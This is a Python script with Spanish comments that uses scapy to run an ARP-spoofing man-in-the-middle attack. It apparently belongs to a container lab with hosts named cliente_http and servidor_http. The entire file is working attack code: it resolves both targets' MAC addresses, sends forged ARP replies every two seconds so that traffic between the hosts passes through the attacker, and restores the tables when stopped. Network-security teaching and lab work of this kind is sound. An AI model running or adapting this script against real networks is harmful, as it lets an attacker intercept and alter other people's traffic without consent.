"""
arp_spoof.py
Envenena las tablas ARP de cliente_http y servidor_http para que ambos
envien sus tramas a traves de este contenedor (scapy-mitm), permitiendo
interceptar y modificar el trafico HTTP en transito.

Uso:
    python3 arp_spoof.py --cliente-ip 172.19.0.3 --servidor-ip 172.19.0.2
"""
import argparse
import sys
import time
import threading
from scapy.all import ARP, Ether, srp, send, conf

conf.verb = 0
stop_event = threading.Event()


def obtener_mac(ip):
    """Resuelve la MAC de una IP mediante una peticion ARP broadcast."""
    paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    respuesta = srp(paquete, timeout=3, retry=2)[0]
    if respuesta:
        return respuesta[0][1].hwsrc
    raise RuntimeError(f"No se pudo resolver la MAC de {ip}. Verifica que el contenedor este activo.")


def envenenar(ip_objetivo, mac_objetivo, ip_suplantada):
    """Envia una respuesta ARP falsa: le dice a ip_objetivo que ip_suplantada
    esta en la MAC de este contenedor (nuestra propia MAC)."""
    paquete = ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_suplantada)
    send(paquete)


def restaurar(ip_objetivo, mac_objetivo, ip_real, mac_real):
    """Restaura la tabla ARP real al finalizar (evita dejar la red en mal estado)."""
    paquete = ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo,
                  psrc=ip_real, hwsrc=mac_real)
    send(paquete, count=4)


def loop_spoof(cliente_ip, servidor_ip, mac_cliente, mac_servidor):
    print(f"[+] Envenenando ARP: {cliente_ip} <-> {servidor_ip} (cada 2s, Ctrl+C para detener)")
    while not stop_event.is_set():
        envenenar(cliente_ip, mac_cliente, servidor_ip)   # cliente cree que somos el servidor
        envenenar(servidor_ip, mac_servidor, cliente_ip)   # servidor cree que somos el cliente
        time.sleep(2)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--cliente-ip", required=True, help="IP del contenedor cliente_http")
    parser.add_argument("--servidor-ip", required=True, help="IP del contenedor servidor_http")
    args = parser.parse_args()

    try:
        mac_cliente = obtener_mac(args.cliente_ip)
        mac_servidor = obtener_mac(args.servidor_ip)
        print(f"[+] MAC cliente ({args.cliente_ip}): {mac_cliente}")
        print(f"[+] MAC servidor ({args.servidor_ip}): {mac_servidor}")
    except RuntimeError as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

    hilo = threading.Thread(target=loop_spoof, args=(args.cliente_ip, args.servidor_ip, mac_cliente, mac_servidor))
    hilo.start()

    try:
        while hilo.is_alive():
            hilo.join(1)
    except KeyboardInterrupt:
        print("\n[+] Deteniendo y restaurando tablas ARP...")
        stop_event.set()
        hilo.join()
        restaurar(args.cliente_ip, mac_cliente, args.servidor_ip, mac_servidor)
        restaurar(args.servidor_ip, mac_servidor, args.cliente_ip, mac_cliente)
        print("[+] ARP restaurado. Fin.")
